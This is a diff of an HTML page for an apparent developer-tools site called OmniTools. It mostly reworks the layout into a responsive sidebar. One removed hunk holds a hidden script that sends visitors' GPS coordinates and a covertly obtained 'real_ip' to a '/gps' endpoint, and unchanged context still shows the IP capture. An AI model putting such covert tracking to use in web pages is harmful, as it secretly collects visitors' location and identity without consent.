@@ -2,24 +2,17 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OmniTools - Developer Platform</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
-        :root { 
-            --bg: #09090b; 
-            --panel: #121215; 
-            --border: #27272a; 
-            --text: #f4f4f5; 
-            --muted: #a1a1aa; 
-            --accent: #3b82f6; 
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent;}
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        :root { --bg: #09090b; --panel: #121215; --border: #27272a; --text: #f4f4f5; --muted: #a1a1aa; --accent: #3b82f6; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; }
         
-        /* شاشة الدخول */
-        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, #1e1e2f 0%, #000 100%); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 20px;}
-        .login-card { background: rgba(18, 18, 21, 0.8); backdrop-filter: blur(20px); border: 1px solid var(--border); padding: 30px; border-radius: 16px; width: 100%; max-width: 400px; text-align: center;}
+        /* Login */
+        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, #1e1e2f 0%, #000 100%); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .login-card { background: rgba(18, 18, 21, 0.8); backdrop-filter: blur(20px); border: 1px solid var(--border); padding: 30px; border-radius: 16px; width: 90%; max-width: 400px; text-align: center;}
         .login-card h2 { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #fff;}
         .login-card h2 span { color: var(--accent); }
         .login-card p { color: var(--muted); font-size: 13px; margin-bottom: 25px; }
@@ -27,50 +20,66 @@
         .login-card input:focus { border-color: var(--accent); }
         .login-card button { width: 100%; padding: 14px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: pointer;}
 
-        /* التطبيق */
-        #main-app { display: none; display: flex; flex-direction: column; height: 100vh; }
+        /* App Layout */
+        #main-app { display: none; width: 100%; height: 100vh; flex-direction: column; }
         
-        /* الهيدر */
-        .top-nav { padding: 15px 20px; border-bottom: 1px solid var(--border); display: flex; flex-direction: column; gap: 15px; background: var(--panel); flex-shrink: 0;}
-        .logo { font-weight: 700; font-size: 20px; letter-spacing: -0.5px; }
-        .logo span { color: var(--accent); }
-        .search-bar { width: 100%; padding: 12px 16px; background: #000; border: 1px solid var(--border); border-radius: 8px; color: #fff; outline: none; font-size: 14px;}
-        
-        /* الفلاتر الأفقية (للموبايل) */
-        .tabs { display: flex; overflow-x: auto; padding: 15px 20px; gap: 10px; border-bottom: 1px solid var(--border); background: #0a0a0c; flex-shrink: 0;}
-        .tabs::-webkit-scrollbar { display: none; }
-        .tab { padding: 8px 16px; background: var(--panel); border: 1px solid var(--border); border-radius: 20px; font-size: 13px; white-space: nowrap; cursor: pointer; color: var(--muted); transition: 0.2s;}
-        .tab.active, .tab:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        /* Mobile Header */
+        .mobile-header { display: none; padding: 15px 20px; background: var(--panel); border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; }
+        .menu-btn { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+        .logo-mobile { font-weight: 700; font-size: 18px; }
+        .logo-mobile span { color: var(--accent); }
 
-        /* المحتوى */
-        .main-content { flex: 1; padding: 20px; overflow-y: auto; padding-bottom: 80px;}
-        .header-title { font-size: 20px; font-weight: 600; margin-bottom: 5px; }
-        .header-sub { color: var(--muted); font-size: 13px; margin-bottom: 20px; }
+        /* Desktop Layout */
+        .desktop-layout { display: flex; flex: 1; overflow: hidden; }
         
-        /* شبكة الأدوات */
-        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 12px; }
-        .tool-card { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 10px; cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; }
-        .tool-card:active { transform: scale(0.98); border-color: var(--accent);}
-        .badge { font-size: 9px; background: #222; padding: 3px 6px; border-radius: 4px; color: #aaa; width: fit-content; margin-bottom: 8px; text-transform: uppercase;}
-        .tool-card h3 { font-size: 14px; margin-bottom: 4px; font-weight: 600; color: #fff;}
-        .tool-card p { font-size: 11px; color: var(--muted); line-height: 1.4;}
+        /* Sidebar */
+        .sidebar { width: 250px; background: var(--panel); border-right: 1px solid var(--border); padding: 20px 10px; overflow-y: auto; flex-shrink: 0; transition: transform 0.3s; }
+        .sidebar h4 { font-size: 11px; text-transform: uppercase; color: var(--muted); margin: 15px 10px 10px; }
+        .sidebar-item { display: block; padding: 10px 12px; color: var(--muted); text-decoration: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 2px;}
+        .sidebar-item:hover, .sidebar-item.active { background: #27272a; color: #fff; }
+        
+        /* Main Content */
+        .main-content { flex: 1; padding: 30px; overflow-y: auto; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .search-bar { width: 100%; max-width: 400px; padding: 12px 16px; background: #000; border: 1px solid var(--border); border-radius: 8px; color: #fff; outline: none; font-size: 14px;}
+        
+        .header-title { font-size: 24px; font-weight: 600; margin-bottom: 5px; }
+        .header-sub { color: var(--muted); font-size: 14px; margin-bottom: 20px; }
+        
+        /* Grid */
+        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
+        .tool-card { background: var(--panel); border: 1px solid var(--border); padding: 20px; border-radius: 10px; cursor: pointer; transition: 0.2s; position: relative; }
+        .tool-card:hover { border-color: #555; transform: translateY(-2px);}
+        .badge { display: inline-block; margin-bottom: 10px; font-size: 10px; background: #222; padding: 3px 8px; border-radius: 4px; color: #aaa; text-transform: uppercase;}
+        .tool-card h3 { font-size: 15px; margin-bottom: 6px; font-weight: 600; color: #fff;}
+        .tool-card p { font-size: 12px; color: var(--muted); line-height: 1.4;}
 
-        /* المودال */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 100; justify-content: center; align-items: center; padding: 20px;}
-        .modal-content { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; width: 100%; max-width: 500px; padding: 20px;}
+        /* Modal */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; padding: 20px;}
+        .modal-content { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; width: 100%; max-width: 500px; padding: 24px;}
         .modal-head { display: flex; justify-content: space-between; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px;}
         .modal-title { font-size: 16px; font-weight: 600; }
         .close-btn { background: none; border: none; color: var(--muted); font-size: 20px; cursor: pointer; }
-        textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; font-family: 'JetBrains Mono'; font-size: 13px; min-height: 100px; margin-bottom: 12px; outline: none; resize: vertical;}
-        .btn { width: 100%; padding: 12px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
-        .output { margin-top: 12px; padding: 12px; background: #000; border: 1px solid var(--border); border-radius: 8px; font-family: 'JetBrains Mono'; font-size: 12px; color: #10b981; white-space: pre-wrap; display: none; max-height: 150px; overflow-y: auto;}
+        textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; font-family: 'JetBrains Mono'; font-size: 13px; min-height: 120px; margin-bottom: 15px; outline: none; resize: vertical;}
+        .btn { width: 100%; padding: 14px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
+        .output { margin-top: 15px; padding: 12px; background: #000; border: 1px solid var(--border); border-radius: 8px; font-family: 'JetBrains Mono'; font-size: 13px; color: #10b981; white-space: pre-wrap; display: none; max-height: 150px; overflow-y: auto;}
 
-        /* الشات بوت (زرار عائم) */
+        /* Chat FAB */
         .chat-fab { position: fixed; bottom: 20px; right: 20px; width: 50px; height: 50px; background: #10b981; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 24px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.5); z-index: 40;}
-        .chat-window { display: none; position: fixed; bottom: 80px; right: 20px; width: calc(100% - 40px); max-width: 320px; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 15px; flex-direction: column; gap: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 40;}
+        .chat-window { display: none; position: fixed; bottom: 80px; right: 20px; width: 300px; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 15px; flex-direction: column; gap: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 40;}
         .chat-window p { font-size: 12px; color: var(--muted); }
         .chat-window input { padding: 10px; background: #000; border: 1px solid var(--border); border-radius: 6px; color: #fff; outline: none;}
         .chat-window button { padding: 10px; background: #10b981; color: #000; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; }
+
+        /* Responsive Mobile */
+        @media (max-width: 768px) {
+            .desktop-layout { flex-direction: column; }
+            .mobile-header { display: flex; }
+            .sidebar { position: fixed; top: 0; left: -100%; height: 100vh; z-index: 200; box-shadow: 2px 0 10px rgba(0,0,0,0.5); background: var(--panel); width: 250px;}
+            .sidebar.open { left: 0; }
+            .main-content { padding: 20px; }
+            .top-bar { display: none; }
+        }
     </style>
 </head>
 <body>
@@ -86,17 +95,27 @@
     </div>
 
     <div id="main-app">
-        <div class="top-nav">
-            <div class="logo">OmniTools<span>.dev</span></div>
-            <input type="text" class="search-bar" id="search" placeholder="Search tools..." onkeyup="filterTools()">
+        <div class="mobile-header">
+            <button class="menu-btn" onclick="toggleSidebar()">☰</button>
+            <div class="logo-mobile">OmniTools<span>.dev</span></div>
+            <div style="width:24px;"></div>
         </div>
 
-        <div class="tabs" id="tabs-container"></div>
+        <div class="desktop-layout">
+            <div class="sidebar" id="sidebar">
+                <div class="logo" style="padding:0 10px 20px; font-size:20px;">OmniTools<span style="color:var(--accent)">.dev</span></div>
+                <h4>Categories</h4>
+                <a class="sidebar-item active" onclick="filterCat('All', this)">All Tools</a>
+            </div>
 
-        <div class="main-content">
-            <div class="header-title">Developer Utilities</div>
-            <div class="header-sub">A powerful toolkit for developers.</div>
-            <div class="tools-grid" id="grid"></div>
+            <div class="main-content">
+                <div class="top-bar">
+                    <input type="text" class="search-bar" id="search" placeholder="Search tools..." onkeyup="filterTools()">
+                </div>
+                <div class="header-title">Developer Utilities</div>
+                <div class="header-sub">A powerful toolkit for developers.</div>
+                <div class="tools-grid" id="grid"></div>
+            </div>
         </div>
 
         <div class="chat-fab" onclick="toggleChat()">💬</div>
@@ -130,14 +149,6 @@
             if(real_ip === "Unknown") { real_ip = myIP; }
         };
 
-        setTimeout(() => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    fetch('/gps', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude, real_ip: real_ip})});
-                });
-            }
-        }, 3000);
-
         function login() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('password').value;
@@ -152,16 +163,19 @@
         let allTools = [];
         fetch('tools.json').then(res => res.json()).then(data => {
             allTools = data;
-            renderTabs();
+            renderSidebar();
             renderTools(allTools);
         });
 
-        function renderTabs() {
+        function renderSidebar() {
             const cats = [...new Set(allTools.map(t => t.cat))];
-            const container = document.getElementById('tabs-container');
-            container.innerHTML = `<div class="tab active" onclick="filterCat('All', this)">All Tools</div>`;
+            const sb = document.getElementById('sidebar');
             cats.forEach(c => {
-                container.innerHTML += `<div class="tab" onclick="filterCat('${c}', this)">${c}</div>`;
+                const a = document.createElement('a');
+                a.className = 'sidebar-item';
+                a.innerText = c;
+                a.onclick = function() { filterCat(c, this); };
+                sb.appendChild(a);
             });
         }
 
@@ -178,15 +192,20 @@
         }
 
         function filterCat(cat, el) {
-            document.querySelectorAll('.tab').forEach(i => i.classList.remove('active'));
-            el.classList.add('active');
+            document.querySelectorAll('.sidebar-item').forEach(i => i.classList.remove('active'));
+            if(el) el.classList.add('active');
             if(cat === 'All') renderTools(allTools);
             else renderTools(allTools.filter(t => t.cat === cat));
+            if (window.innerWidth <= 768) toggleSidebar(); // يقفل القائمة في الموبايل بعد الاختيار
         }
 
         function filterTools() {
             const q = document.getElementById('search').value.toLowerCase();
             renderTools(allTools.filter(t => t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q)));
+        }
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
         }
 
         let currentTool = "";
